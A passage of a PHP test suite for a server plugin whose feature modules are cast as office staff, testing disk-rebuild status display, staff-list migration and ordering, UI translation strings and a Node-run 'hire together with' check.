    $b = waBuilding(['mdResyncPos' => '500', 'mdResyncSize' => '1000', 'mdResync' => '1000', 'mdResyncAction' => 'recon 2', 'mdResyncDt' => '10', 'mdResyncDb' => '100'],
        readCfg("$tmp/disks.ini", true));
    same('where building: a data disk being rebuilt (recon <n>) - that disk, as a rebuild, half way', [['disk2'], 'rebuild', 50.0], [array_keys($b), $b['disk2']['what'] ?? null, $b['disk2']['percent'] ?? null]);
    $b = waBuilding(['mdResyncPos' => '500', 'mdResyncSize' => '1000', 'mdResyncAction' => 'recon 2', 'mdResyncDt' => '0', 'mdResyncDb' => '0'], readCfg("$tmp/disks.ini", true));
    same('where building: paused (mdResyncDt 0) - said, no time to go', ['eta' => null, 'paused' => true], array_intersect_key($b['disk2'] ?? [], ['eta' => 1, 'paused' => 1]));
    $b = waBuilding(['mdResyncPos' => '500', 'mdResyncSize' => '1000', 'mdResyncAction' => 'recon Q'], readCfg("$tmp/disks.ini", true) + ['parity2' => ['name' => 'parity2', 'type' => 'Parity', 'status' => 'DISK_INVALID', 'device' => 'sdq']]);
    same('where building: parity2 (recon Q) - a parity build; the invalid data disk meanwhile a rebuild', ['disk2' => 'rebuild', 'parity2' => 'parity'], array_map(fn ($x) => $x['what'], $b));
    // a new data disk cleared before it joins: only the DISK_NEW one
    file_put_contents("$tmp/disks.ini", $disks . $disk('disk3', 'Data', 'DISK_NEW', 'sdc'));
    $b = waBuilding(['mdResyncPos' => '250', 'mdResyncSize' => '1000', 'mdResyncAction' => 'clear'], readCfg("$tmp/disks.ini", true));
    same('where building: a clear - the new disk only (the invalid parity is not what a clear works on)', [['disk3'], 'clear', 25.0], [array_keys($b), $b['disk3']['what'] ?? null, $b['disk3']['percent'] ?? null]);
    same('where building: no var.ini (the array stopped) - nothing', [], waBuilding([], readCfg("$tmp/disks.ini", true)));
    hardeningRm($tmp);

    // the page: the accent chip instead of the red status, the bad count leaves such a disk out, the texts
    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    check('where building: the disk row shows the building chip in place of the red status', str_contains($js, "d.building ? buildingChip(d.building) : (d.status && d.status !== 'DISK_OK' ? chip(d.status, 'danger') : null)"));
    check('where building: the chip is accent with the time to go as its tip', str_contains($js, "return chip(T('where.building.' + b.what, { p }), 'accent', tip);")
        && str_contains($js, "T('where.building.eta', { time: fmt.duration(b.eta) })"));
    check('where building: a building disk is not counted among the bad ones', str_contains($js, "(d.status && d.status !== 'DISK_OK' && !d.building)"));
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/en.json'), true);
    same('where building: every text the chip asks for', [], array_values(array_filter(['where.building.parity', 'where.building.rebuild', 'where.building.clear',
        'where.building.eta', 'where.building.paused', 'where.building.hint'], fn ($k) => !isset($en[$k]))));
}

/**
 * Ms. Dustdevil's tick: three parts, each on its own — one that throws (an exception in her jobs) doesn't stop
 * the du jobs of «where is what»; said once in the log, again only after it worked once more
 */
function testCleanupTick(): void
{
    same('cleanup tick: her parts, in order', ['jobs' => 'clJobsTick', 'backup' => 'clBackupFlagTick', 'where' => 'whereJobsTick'], clTickParts());
    same('cleanup tick: each a function', [], array_keys(array_filter(clTickParts(), fn ($f) => !is_callable($f))));
    $ran = [];
    $boom = true;
    $parts = ['a' => function () use (&$ran): void { $ran[] = 'a'; },
              'b' => function () use (&$boom): void { if ($boom) { throw new RuntimeException('boom'); } },
              'c' => function () use (&$ran): void { $ran[] = 'c'; }];
    $GLOBALS['clTickFailed'] = [];
    $log = AGENT_LOG;
    $before = is_file($log) ? (int) filesize($log) : 0;
    clTickEach($parts);
    same('cleanup tick: one part throwing stops nobody else', ['a', 'c'], $ran);
    same('cleanup tick: noted', ['b' => true], $GLOBALS['clTickFailed']);
    clTickEach($parts);
    same('cleanup tick: still noted, the others ran again', [['b' => true], ['a', 'c', 'a', 'c']], [$GLOBALS['clTickFailed'], $ran]);
    $boom = false;
    clTickEach($parts);
    same('cleanup tick: works again — forgotten (said again should it fail once more)', [], $GLOBALS['clTickFailed']);
    if (is_dir(DATA_DIR)) {
        $lines = substr((string) file_get_contents($log), $before);
        same('cleanup tick: said once in the log, and once when it works again', [1, 1],
            [substr_count($lines, 'cleanup: tick b failed: boom'), substr_count($lines, 'cleanup: tick b works again')]);
    }
    unset($GLOBALS['clTickFailed']);
}

/**
 * The staff list: a server that had Ms. Whereabouts hired has Ms. Dustdevil hired (since the earlier of the two),
 * Ms. Whereabouts gone from the list — rewritten once by the web side (src/staff.php, under its lock, new file +
 * rename); until then the agent counts her as Ms. Dustdevil.
 */
function testStaffMerged(): void
{
    require_once OFFICE_DIR . '/src/staff.php';
    same('staff merged: the agent\'s list and the web side\'s are the same', OFFICE_DESKS_MERGED, STAFF_MERGED);
    $desks = ['backup' => [], 'cleanup' => [], 'caretaker' => []];
    same('staff merged: whereabouts becomes cleanup, since the earlier', ['backup' => 5, 'cleanup' => 7],
        officeStaffMerged(['hired' => ['backup' => 5, 'whereabouts' => 7, 'cleanup' => 9]], $desks)['hired'] ?? null);
    same('staff merged: cleanup hired earlier keeps its time', ['cleanup' => 3], officeStaffMerged(['hired' => ['whereabouts' => 7, 'cleanup' => 3]], $desks)['hired'] ?? null);
    same('staff merged: only whereabouts hired', ['backup' => 5, 'cleanup' => 7], officeStaffMerged(['hired' => ['backup' => 5, 'whereabouts' => 7]], $desks)['hired'] ?? null);
    same('staff merged: nothing to do', [null, null], [officeStaffMerged(['hired' => ['cleanup' => 1]], $desks), officeStaffMerged([], $desks)]);
    same('staff merged: not while whereabouts is still a desk, nor without cleanup', [null, null],
        [officeStaffMerged(['hired' => ['whereabouts' => 7]], $desks + ['whereabouts' => []]), officeStaffMerged(['hired' => ['whereabouts' => 7]], ['backup' => []])]);
    same('staff merged: the agent counts her as Ms. Dustdevil until then', ['backup', 'cleanup', 'cleanup'],
        staffMergedIds(['backup', 'whereabouts', 'cleanup'], $desks));
    same('staff merged: the agent leaves a desk that is there alone', ['whereabouts'], staffMergedIds(['whereabouts'], ['whereabouts' => []]));

    // the agent's migration step rewrites staff.json once (since 1.44; up to 1.43 the web side did), the list before kept
    $tmp = hardeningTmp('staff-merged');
    mkdir("$tmp/office", 0700);
    $file = "$tmp/office/staff.json";
    $before = json_encode(['hired' => ['backup' => 5, 'whereabouts' => 7, 'watchman' => 8], 'other' => 'kept']);
    file_put_contents($file, $before);
    $desks = ['backup' => [], 'cleanup' => [], 'watchman' => []];
    $said = officeMigrateStaff($tmp, '1.44.0', $desks);
    $saved = json_decode((string) file_get_contents($file), true);
    same('staff migrate: written once by the step — whereabouts is cleanup now, the rest as it was', ['hired' => ['backup' => 5, 'watchman' => 8, 'cleanup' => 7], 'other' => 'kept'], $saved);
    same('staff migrate: … the list before kept beside it, said in the log', [$before, true],
        [@file_get_contents("$file.before-1.44.0"), str_contains($said, 'whereabouts → cleanup') && str_contains($said, 'staff.json.before-1.44.0')]);
    same('staff migrate: the second time changes nothing', ['nothing to change', $saved], [officeMigrateStaff($tmp, '1.44.0', $desks), json_decode((string) file_get_contents($file), true)]);
    same('staff migrate: mode, no temporary files, the web side\'s lock file', ['644', [], true], [substr(sprintf('%o', fileperms($file)), -3),
        array_values(array_filter(scandir("$tmp/office") ?: [], fn ($n) => str_ends_with($n, '.tmp'))), is_file("$tmp/office/.staff.lock")]);
    same('staff migrate: an empty list stays an object', '{}', (function () use ($tmp, $file, $desks) {
        file_put_contents($file, json_encode(['hired' => (object) [], 'order' => ['whereabouts']]));
        officeMigrateStaff($tmp, '1.44.0', $desks);
        return json_encode(json_decode((string) file_get_contents($file))->hired ?? null);
    })());
    same('staff migrate: no list — nothing; a link — left alone', ['nothing to change (no staff list)', 'office/staff.json left alone (no plain file)'],
        (function () use ($tmp, $file, $desks) {
            unlink($file);
            $none = officeMigrateStaff($tmp, '1.44.0', $desks);
            file_put_contents("$tmp/elsewhere.json", json_encode(['hired' => ['whereabouts' => 1]]));
            symlink("$tmp/elsewhere.json", $file);
            return [$none, officeMigrateStaff($tmp, '1.44.0', $desks)];
        })());
    same('staff migrate: … nothing written through the link', ['hired' => ['whereabouts' => 1]], json_decode((string) file_get_contents("$tmp/elsewhere.json"), true));
    unlink($file);
    check('staff migrate: a step of the agent\'s migrations', in_array('staff-merged', array_column(officeMigrateSteps(), 'id'), true));

    // the web side: reads the list merged for the moment before the step ran — and never writes it (a process of its own)
    // (the plugin's layout: src/ beside the repository's desks, the data folder in $tmp/data)
    hardeningRm($tmp);
    $tmp = hardeningTmp('staff-merged-web');
    mkdir("$tmp/plugin/src", 0700, true);
    foreach (glob(OFFICE_DIR . '/src/*.php') ?: [] as $f) {
        copy($f, "$tmp/plugin/src/" . basename($f));
    }
    symlink(OFFICE_DIR . '/public/desks', "$tmp/plugin/desks");
    symlink(OFFICE_DIR . '/public/lang', "$tmp/plugin/lang");
    mkdir("$tmp/data/office", 0700, true);
    $file = "$tmp/data/office/staff.json";
    file_put_contents($file, $before);
    $web = "$tmp/web.php";
    file_put_contents($web, '<?php require ' . var_export("$tmp/plugin/src/bootstrap.php", true) . ';'
        . ' echo json_encode([officeHired(), officeStaffOrder()]);');
    $p = proc_open([PHP_BINARY, $web], [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
        ['OFFICE_DATA_DIR' => "$tmp/data", 'OFFICE_RUN_DIR' => TESTS_RUN_DIR, 'PATH' => getenv('PATH')]);
    $raw = (string) stream_get_contents($pipes[1]) . (string) stream_get_contents($pipes[2]);
    proc_close($p);
    $out = json_decode($raw, true);
    same('staff read: the web side reads Ms. Whereabouts as Ms. Dustdevil before the step', [7, false], [$out[0]['cleanup'] ?? $raw, isset($out[0]['whereabouts'])]);
    same('staff read: … and leaves the file as it is (the agent migrates, never the page)', [$before, ['staff.json']],
        [file_get_contents($file), array_values(array_diff(scandir("$tmp/data/office") ?: [], ['.', '..']))]);
    check('staff read: no rewrite on the web side any more', !function_exists('officeStaffMigrate')
        && !str_contains((string) file_get_contents(OFFICE_DIR . '/src/staff.php'), 'officeStaffMigrate'));
    hardeningRm($tmp);
}

/**
 * The staff's order (2026-10-07: «Change the order» at the reception): kept in staff.json "order" through
 * office.staff_order (src/staff.php) — the team lead first and never moved, ids of desks that are gone dropped, the
 * desks it doesn't name after the named ones in desk.json's order, a desk that went into another one at the earlier
 * place; the page gets it as CONFIG.staff_order. A fresh office shows Ms. Dustdevil right after the team lead, where
 * Ms. Whereabouts was.
 */
function testStaffOrder(): void
{
    require_once OFFICE_DIR . '/src/staff.php';
    // desk.json's order: what a fresh office shows
    $meta = [];
    foreach (glob(OFFICE_DIR . '/public/desks/*/desk.json') ?: [] as $f) {
        $meta[basename(dirname($f))] = json_decode((string) file_get_contents($f), true) ?: [];
    }
    uksort($meta, fn ($a, $b) => [(int) ($meta[$a]['order'] ?? 100), $a] <=> [(int) ($meta[$b]['order'] ?? 100), $b]);
    $default = array_keys($meta);
    same('staff order: a fresh office — the team lead, then Ms. Dustdevil (where Ms. Whereabouts was, order 20)',
        [['caretaker', 'cleanup'], 20], [array_slice($default, 0, 2), $meta['cleanup']['order'] ?? null]);
    same('staff order: Ms. Moverelli right before Jack Emby, Ms. Protocolli last (2026-10-13)',
        [true, 'logs'], [array_search('moverelli', $default) + 1 === array_search('jack', $default), end($default)]);
    check('staff order: no desk.json places a desk differently at the reception any more',
        !array_filter($meta, fn ($m) => array_key_exists('reception_order', $m)));

    $desks = ['caretaker' => ['always' => true], 'cleanup' => [], 'backup' => [], 'restore' => [], 'snapshot' => [], 'logs' => []];
    same('staff order: none set — desk.json\'s', ['caretaker', 'cleanup', 'backup', 'restore', 'snapshot', 'logs'], officeStaffOrderOf([], $desks));
    same('staff order: the user\'s, the rest after it in desk.json\'s order', ['caretaker', 'logs', 'backup', 'cleanup', 'restore', 'snapshot'],
        officeStaffOrderOf(['order' => ['logs', 'backup']], $desks));
    same('staff order: unknown ids and odd entries dropped, each once, the team lead stays first',
        ['caretaker', 'backup', 'logs', 'cleanup', 'restore', 'snapshot'],
        officeStaffOrderOf(['order' => ['ghost', 'backup', 'caretaker', 'backup', 'logs', 7, null, ['x'], "logs\n"]], $desks));
    same('staff order: an "order" that isn\'t a list counts for nothing', officeStaffOrderOf([], $desks), officeStaffOrderOf(['order' => 'backup'], $desks));
    same('staff order: a desk that went into another one counts as that one, at the earlier place',
        ['caretaker', 'cleanup', 'backup', 'restore', 'snapshot', 'logs'], officeStaffOrderOf(['order' => ['whereabouts', 'backup', 'cleanup']], $desks));
    same('staff order: … also when the old one is the later', ['caretaker', 'cleanup', 'backup', 'restore', 'snapshot', 'logs'],
        officeStaffOrderOf(['order' => ['cleanup', 'backup', 'whereabouts']], $desks));
    same('staff merged: the order too — whereabouts becomes cleanup at the earlier place, the rest untouched',
        ['backup', 'cleanup', 'ghost', 'logs'], officeStaffMerged(['hired' => ['backup' => 1], 'order' => ['backup', 'whereabouts', 'ghost', 'logs', 'cleanup']], $desks)['order'] ?? null);
    same('staff merged: only in the order (no longer hired) — rewritten as well, hired as it was',
        [['backup' => 1], ['cleanup']], array_values(array_intersect_key(officeStaffMerged(['hired' => ['backup' => 1], 'order' => ['whereabouts']], $desks) ?? [], ['hired' => 1, 'order' => 1])));
    same('staff merged: an order without a merged desk is left alone', null, officeStaffMerged(['hired' => ['cleanup' => 1], 'order' => ['logs', 'cleanup']], $desks));
    same('staff merged: hired whereabouts keeps the order as it is', ['logs'], officeStaffMerged(['hired' => ['whereabouts' => 3], 'order' => ['logs']], $desks)['order'] ?? null);

    $core = (string) file_get_contents(OFFICE_DIR . '/public/assets/core.js');
    $api = (string) file_get_contents(OFFICE_DIR . '/src/api.php');
    check('staff order: the API takes office.staff_order, the page sends it, the tabs and the reception follow the order',
        str_contains($api, "\$action === 'office.staff_order'") && str_contains($core, "Office.api.post('office.staff_order'")
        && str_contains($core, 'for (const d of Office.staffInOrder()) add(') && str_contains($core, 'for (const desk of Office.staffInOrder())')
        && !str_contains($core, 'reception_order'));
    check('staff order: the team lead\'s «The team» follows it', str_contains((string) file_get_contents(OFFICE_DIR . '/public/desks/caretaker/desk.js'), 'Office.deskRank(a.id) - Office.deskRank(b.id)'));

    // the arrange mode's polish (2026-10-07): the head's button turns into «✓ Done» with «As at the start» before
    // it, big arrow buttons on the cards (the words as a tip and for screen readers), the bar only while the head's
    // buttons are out of view
    $arrange = preg_match('/^function arrangeable\(.*?^}\n/ms', $core, $m) ? $m[0] : '';
    check('arrange: the head\'s button is «Change the order», while arranging «✓ Done» (the same button, filled) — it ends arranging',
        str_contains($arrange, "on ? t('office.order_done') : t('office.order_change')")
        && str_contains($arrange, "on ? t('office.order_done_title') : t('office.order_change_title')")
        && str_contains($arrange, "start.classList.toggle('plain', !on)")
        && str_contains($arrange, "start.onclick = () => (arranging() ? done() : open())")
        && !str_contains($arrange, 'start.hidden'));
    check('arrange: «As at the start» before it in the head, only while arranging, off when nothing to do',
        str_contains($arrange, "el('button', 'btn small plain', t('office.order_default'))")
        && str_contains($arrange, "back.title = t('office.order_default_title')")
        && str_contains($arrange, 'group.append(back, start)') && str_contains($arrange, 'back.hidden = hint.hidden = !on')
        && str_contains($arrange, 'back.disabled = isDefault()') && str_contains($arrange, 'back.onclick = reset'));
    check('arrange: big arrows ▲ / ▼ on the cards — the glyph alone, the word as data-tip and in the aria-label',
        str_contains($arrange, "el('button', 'btn plain order-arrow', glyph)") && str_contains($arrange, 'b.dataset.tip = label')
        && str_contains($arrange, 'b.setAttribute(\'aria-label\', `${t(`${id}.name`)}: ${label}`)')
        && str_contains($arrange, "button('▲', t('office.order_up'), -1)") && str_contains($arrange, "button('▼', t('office.order_down'), 1)")
        && !str_contains($arrange, '`${glyph} ${label}`'));
    check('arrange: ▲ off on the first movable card, ▼ on the last; the keyboard stays on the arrow it pressed',
        str_contains($arrange, 'moves.get(id).up.disabled = i === 0; moves.get(id).down.disabled = i === free.length - 1')
        && str_contains($arrange, "(b.disabled ? moves.get(id)[step < 0 ? 'down' : 'up'] : b).focus({ preventScroll: true })"));
    check('arrange: the team lead\'s card keeps its chip', str_contains($arrange, "el('span', 'chip quiet', t('office.order_lead'))"));
    check('arrange: the bar at the bottom only while «✓ Done» in the head is out of view (watched; without the observer it stays)',
        str_contains($arrange, 'if (!arranging() || headSeen) { Office.selbar(null); return; }')
        && str_contains($arrange, 'watch = new IntersectionObserver(') && str_contains($arrange, 'watch.observe(start)')
        && str_contains($arrange, 'if (!window.IntersectionObserver) { headSeen = false; return; }')
        && str_contains($arrange, "if (!grid.isConnected) { stopWatch(); return; }"));
    $css = (string) file_get_contents(OFFICE_DIR . '/public/assets/office.css');
    check('arrange: the arrows are 44 px targets, the cards a row with the arrows on the right, every colour a token',
        preg_match('/^\.btn\.order-arrow\{width:44px; height:44px; padding:0;[^}]*\}$/m', $css) === 1
        && str_contains($css, '.reception.arranging .desk-card{flex-direction:row; align-items:center;')
        && str_contains($css, '.desk-card-move{display:none; align-items:center; gap:6px; flex:none; margin-left:auto}')
        && preg_match('/^\.order-hint\{[^}]*color:var\(--ink2\)[^}]*\}$/m', $css) === 1
        && !preg_match('/order-arrow\{[^}]*#[0-9a-f]{3,6}/i', $css));
    foreach (['en', 'de', 'it', 'fr', 'es'] as $code) {
        $l = langFile(OFFICE_DIR . "/public/lang/$code.json");
        check("arrange $code: «✓ Done» carries its tick, its tip and «As at the start»'s are there",
            str_starts_with((string) ($l['office.order_done'] ?? ''), '✓ ') && strlen((string) ($l['office.order_done'] ?? '')) > 4
            && is_string($l['office.order_done_title'] ?? null) && is_string($l['office.order_default_title'] ?? null)
            && str_contains((string) ($l['help.order_text'] ?? ''), (string) $l['office.order_done']));
    }

    // the office action through the web side, in a process of its own: a plugin's layout (src/ beside the web files,
    // the repository's desks and languages), the data folder in $tmp
    $tmp = hardeningTmp('staff-order');
    mkdir("$tmp/plugin/src", 0700, true);
    foreach (glob(OFFICE_DIR . '/src/*.php') ?: [] as $f) {
        copy($f, "$tmp/plugin/src/" . basename($f));
    }
    symlink(OFFICE_DIR . '/public/desks', "$tmp/plugin/desks");
    symlink(OFFICE_DIR . '/public/lang', "$tmp/plugin/lang");
    mkdir("$tmp/data/office", 0700, true);
    $file = "$tmp/data/office/staff.json";
    file_put_contents($file, json_encode(['hired' => ['backup' => 5, 'whereabouts' => 7, 'logs' => 8], 'order' => ['logs', 'whereabouts', 'backup']]));
    $web = "$tmp/web.php";
    file_put_contents($web, '<?php require ' . var_export("$tmp/plugin/src/bootstrap.php", true) . '; require ' . var_export("$tmp/plugin/src/page.php", true) . ';'
        . ' $out = [officeStaffOrder()]; foreach (json_decode(stream_get_contents(STDIN), true) as [$a, $d]) { try {'
        . ' $out[] = $a === "office.staff_order" ? officeStaffOrderAction($d) : ($a === "page" ? ["order" => officePageConfig()["staff_order"]] : officeStaffAction($a, $d)); }'
        . ' catch (OfficeProblem $e) { $out[] = ["error" => $e->key, "params" => $e->params]; } $out[] = json_decode((string) @file_get_contents('
        . var_export($file, true) . '), true); } echo json_encode($out);');
    $webRun = function (array $steps, string $data) use ($web): array {
        $p = proc_open([PHP_BINARY, $web], [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
            ['OFFICE_DATA_DIR' => $data, 'OFFICE_RUN_DIR' => TESTS_RUN_DIR, 'PATH' => getenv('PATH')]);
        fwrite($pipes[0], json_encode($steps));
        fclose($pipes[0]);
        $raw = (string) stream_get_contents($pipes[1]);
        $err = (string) stream_get_contents($pipes[2]);
        proc_close($p);
        return [json_decode($raw, true) ?: [], $raw . $err];
    };
    $rest = fn (array $first): array => array_values(array_unique(array_merge(['caretaker'], $first, $default)));
    [$out, $raw] = $webRun([
        ['office.staff_order', ['order' => ['backup', 'cleanup', 'logs']]],
        ['office.staff_order', ['order' => ['ghost', 'caretaker', 'logs', 'logs', 'whereabouts', '../x', 'backup']]],
        ['office.staff_order', ['order' => ['a' => 'backup']]],
        ['office.staff_order', ['order' => ['backup', 7]]],
        ['office.staff_order', ['order' => array_fill(0, OFFICE_ORDER_MAX + 1, 'backup')]],
        ['office.staff_order', []],
        ['office.hire', ['desks' => ['jack']]],
        ['office.fire', ['desk' => 'logs']],
        ['page', []],
        ['office.staff_order', ['order' => []]],
        ['page', []],
    ], "$tmp/data");
    same('staff order web: read — whereabouts is cleanup now, in the order at her place', $rest(['logs', 'cleanup', 'backup']), $out[0] ?? $raw);
    same('staff order web: a valid order kept, the answer every desk\'s', [$rest(['backup', 'cleanup', 'logs']), ['backup', 'cleanup', 'logs']],
        [$out[1]['order'] ?? $raw, $out[2]['order'] ?? null]);
    same('staff order web: the hired list as it was, merged once', ['backup' => 5, 'logs' => 8, 'cleanup' => 7], $out[2]['hired'] ?? null);
    same('staff order web: unknown ids dropped, the team lead never in it, each once, the merged desk as the one that took over',
        [$rest(['logs', 'cleanup', 'backup']), ['logs', 'cleanup', 'backup']], [$out[3]['order'] ?? $raw, $out[4]['order'] ?? null]);
    same('staff order web: no list, a number in it, too long, nothing sent — refused, the file unchanged',
        [['bad_request', ['logs', 'cleanup', 'backup']], ['bad_request', ['logs', 'cleanup', 'backup']], ['bad_request', ['logs', 'cleanup', 'backup']], ['missing_field', ['logs', 'cleanup', 'backup']]],
        [[$out[5]['error'] ?? null, $out[6]['order'] ?? null], [$out[7]['error'] ?? null, $out[8]['order'] ?? null], [$out[9]['error'] ?? null, $out[10]['order'] ?? null], [$out[11]['error'] ?? null, $out[12]['order'] ?? null]]);
    same('staff order web: hiring and letting go keep the order', [['logs', 'cleanup', 'backup'], ['logs', 'cleanup', 'backup']], [$out[14]['order'] ?? $raw, $out[16]['order'] ?? null]);
    same('staff order web: the page gets it (CONFIG.staff_order)', $rest(['logs', 'cleanup', 'backup']), $out[17]['order'] ?? $raw);
    same('staff order web: «As at the start» — no order kept, desk.json\'s again', [$default, false, $default],
        [$out[19]['order'] ?? $raw, array_key_exists('order', $out[20] ?? ['order' => 1]), $out[21]['order'] ?? null]);
    same('staff order web: mode and no temporary files', ['644', []], [substr(sprintf('%o', fileperms($file)), -3),
        array_values(array_filter(scandir("$tmp/data/office") ?: [], fn ($n) => str_ends_with($n, '.tmp')))]);
    // without data/office (the agent makes it): said, nothing written
    mkdir("$tmp/none", 0700);
    [$out, $raw] = $webRun([['office.staff_order', ['order' => ['backup']]]], "$tmp/none");
    same('staff order web: no data/office — office_storage, nothing written', ['office_storage', $default, []], [$out[1]['error'] ?? $raw, $out[0] ?? null, array_values(array_diff(scandir("$tmp/none") ?: [], ['.', '..']))]);
    hardeningRm($tmp);
}

/**
 * «Hire together with …» (2026-10-08): a desk names the colleague it needs in desk.json ("with": Mr. Restori
 * needs Mr. Backupsy's packages); officeDesks() passes it to the page, and the Team Lead's candidate row offers both at
 * once — the colleague first — while the colleague isn't hired and would come; else the plain «Hire».
 */
function testHireWith(): void
{
    $tmp = hardeningTmp('hire-with');
    // the web side in a process of its own: a plugin's layout, the data folder in $tmp
    $web = function (string $desks, string $code) use ($tmp): array {
        @mkdir("$tmp/plugin/src", 0700, true);
        foreach (glob(OFFICE_DIR . '/src/*.php') ?: [] as $f) {
            copy($f, "$tmp/plugin/src/" . basename($f));
        }
        @unlink("$tmp/plugin/desks");
        symlink($desks, "$tmp/plugin/desks");
        @unlink("$tmp/plugin/lang");
        symlink(OFFICE_DIR . '/public/lang', "$tmp/plugin/lang");
        @mkdir("$tmp/data/office", 0700, true);
        file_put_contents("$tmp/web.php", '<?php require ' . var_export("$tmp/plugin/src/bootstrap.php", true) . '; ' . $code);
        $p = proc_open([PHP_BINARY, "$tmp/web.php"], [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
            ['OFFICE_DATA_DIR' => "$tmp/data", 'OFFICE_RUN_DIR' => TESTS_RUN_DIR, 'PATH' => getenv('PATH')]);
        $raw = (string) stream_get_contents($pipes[1]) . (string) stream_get_contents($pipes[2]);
        proc_close($p);
        return [json_decode($raw, true), $raw];
    };
    [$out, $raw] = $web(OFFICE_DIR . '/public/desks', 'echo json_encode([array_map(fn ($d) => $d["with"], officeDesks()),'
        . ' officeStaffAction("office.hire", ["desks" => ["backup", "restore"]]),'
        . ' array_keys(json_decode((string) file_get_contents(OFFICE_DATA . "/office/staff.json"), true)["hired"] ?? [])]);');
    same('hire with: Mr. Restori names Mr. Backupsy (desk.json "with"), Jack Emby Ms. Moverelli (his "needs" is his with), nobody else names anyone',
        ['restore' => 'backup', 'jack' => 'moverelli'], is_array($out) ? array_filter($out[0]) : $raw);
    same('hire with: both hired in one go, the colleague first', ['backup', 'restore'], $out[2] ?? $raw);
    // only another desk that exists
    $fake = "$tmp/desks";
    foreach (['a' => 'b', 'b' => 'b', 'c' => 'ghost', 'd' => 7, 'e' => null] as $id => $with) {
        @mkdir("$fake/$id", 0700, true);
        file_put_contents("$fake/$id/desk.json", json_encode(['order' => 50] + ($with === null ? [] : ['with' => $with])));
        file_put_contents("$fake/$id/desk.js", '');
    }
    [$out, $raw] = $web($fake, 'echo json_encode(array_map(fn ($d) => $d["with"], officeDesks()));');
    same('hire with: only another desk that exists — itself, an unknown one, no string: none', ['a' => 'b', 'b' => null, 'c' => null, 'd' => null, 'e' => null], $out ?? $raw);

    // the strings: the button ×5 with its {name}, the colleague's name as «with …» needs it
    foreach (['en', 'de', 'it', 'fr', 'es'] as $l) {
        $ct = json_decode((string) file_get_contents(OFFICE_WEB . "/desks/caretaker/lang/$l.json"), true) ?: [];
        $bk = json_decode((string) file_get_contents(OFFICE_WEB . "/desks/backup/lang/$l.json"), true) ?: [];
        check("hire with: $l — «Hire together with {name}» and Mr. Backupsy's name for it",
            str_contains((string) ($ct['hire_with'] ?? ''), '{name}') && ($bk['name_with'] ?? '') !== '' && !str_contains((string) $bk['name_with'], '{'));
    }
    same('hire with: German — Swiss, the dative', ['Zusammen mit {name} einstellen', 'Herrn Backupsi'],
        [json_decode((string) file_get_contents(OFFICE_WEB . '/desks/caretaker/lang/de.json'), true)['hire_with'] ?? null,
         json_decode((string) file_get_contents(OFFICE_WEB . '/desks/backup/lang/de.json'), true)['name_with'] ?? null]);

    // the Team Lead's row, under node
    $node = trim((string) shell_exec('command -v node 2>/dev/null')) ?: (is_executable('/usr/local/bin/node') ? '/usr/local/bin/node' : '');
    if ($node === '') {
        check('hire with: the candidate row - node is missing here - skipped', true);
        hardeningRm($tmp);
        return;
    }
    file_put_contents("$tmp/t.js", <<<'JS'
const fs = require('fs');
globalThis.OFFICE_DESK_TESTS = {};
globalThis.document = { currentScript: null };
const T = (k, p) => k + (p ? ' ' + JSON.stringify(p) : '');
const mk = (tag, cls, text) => { const n = { tag, className: cls || '', textContent: text || '', children: [], dataset: {}, disabled: false, type: '', onclick: null,
  appendChild(c) { this.children.push(c); return c; } }; n.classList = { add(c) { n.className += ' ' + c; } }; return n; };
const hired = [], toasts = [];
const desks = new Map();
globalThis.Office = { scope: () => T, t: T, el: mk, has: (k) => k === 'backup.name_with', fmt: {}, desk: () => {}, places: () => {}, placesFrom: () => {},
  sections: () => ({ places: () => [], mount: () => false, render() {}, active: () => '' }),      // his row: a stand-in switcher
  place: (a, n) => { n.dataset.place = a; return n; }, avatar: () => mk('span'), agent: { running: true }, deskRank: () => 0, desks, config: {},
  hire: async (ids) => { hired.push(ids); return true; }, toast: (m) => toasts.push(m), loadState: async () => {}, fireDialog: () => {} };
(0, eval)(fs.readFileSync(process.argv[2], 'utf8'));
const c = OFFICE_DESK_TESTS.caretaker;
const walk = (n, out = []) => { if (n && typeof n === 'object') { out.push(n); (n.children || []).forEach((x) => walk(x, out)); } return out; };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
(async () => {
  const out = {};
  const run = async (name, backup, extra) => {
    desks.clear();
    desks.set('backup', { id: 'backup', order: 30, hired: backup.hired, ...extra });
    desks.set('restore', { id: 'restore', order: 35, hired: false, with: 'backup' });
    c.setState({ staff: { backup, restore: { hired: false, ok: true, why: 'with_backup' } } });
    const rows = {};
    for (const x of c.staff()) {
      const b = walk(c.teamRow(x)).find((n) => n.tag === 'button');
      if (!b) { rows[x.id] = null; continue; }
      hired.length = 0; toasts.length = 0;
      await b.onclick();
      await sleep(5);
      rows[x.id] = { text: b.textContent, hires: hired[0] || null, toast: toasts[0] || null };
    }
    out[name] = rows;
  };
  await run('both', { hired: false, ok: true, why: 'yes' });
  await run('colleague_here', { hired: true, ok: true, why: 'yes' });
  await run('colleague_declines', { hired: false, ok: false, why: 'no_cow' });
  await run('colleague_training', { hired: false, ok: true, why: 'yes' }, { training: true });
  console.log(JSON.stringify(out));
})().catch((e) => { console.log(JSON.stringify({ error: String(e && e.stack || e) })); });
JS);
    $raw = (string) shell_exec(escapeshellarg($node) . ' ' . escapeshellarg("$tmp/t.js") . ' ' . escapeshellarg(OFFICE_WEB . '/desks/caretaker/desk.js') . ' 2>&1');
    $r = json_decode($raw, true);
    if (!is_array($r) || isset($r['error'])) {
        check('hire with: the candidate row ran under node', false, $raw);
        hardeningRm($tmp);
        return;
    }
    same('hire with: Mr. Backupsy not here and would come — Mr. Restori\'s button hires both, the colleague first; the toast names both',
        ['text' => 'hire_with {"name":"backup.name_with"}', 'hires' => ['backup', 'restore'], 'toast' => 'hired {"names":"backup.name, restore.name"}'],
        $r['both']['restore'] ?? null);
    same('hire with: … Mr. Backupsy\'s own row stays «Hire», him alone', ['text' => 'hire', 'hires' => ['backup']], array_intersect_key($r['both']['backup'] ?? [], ['text' => 1, 'hires' => 1]));
    same('hire with: Mr. Backupsy hired already, declining or still in training — plain «Hire», Mr. Restori alone',
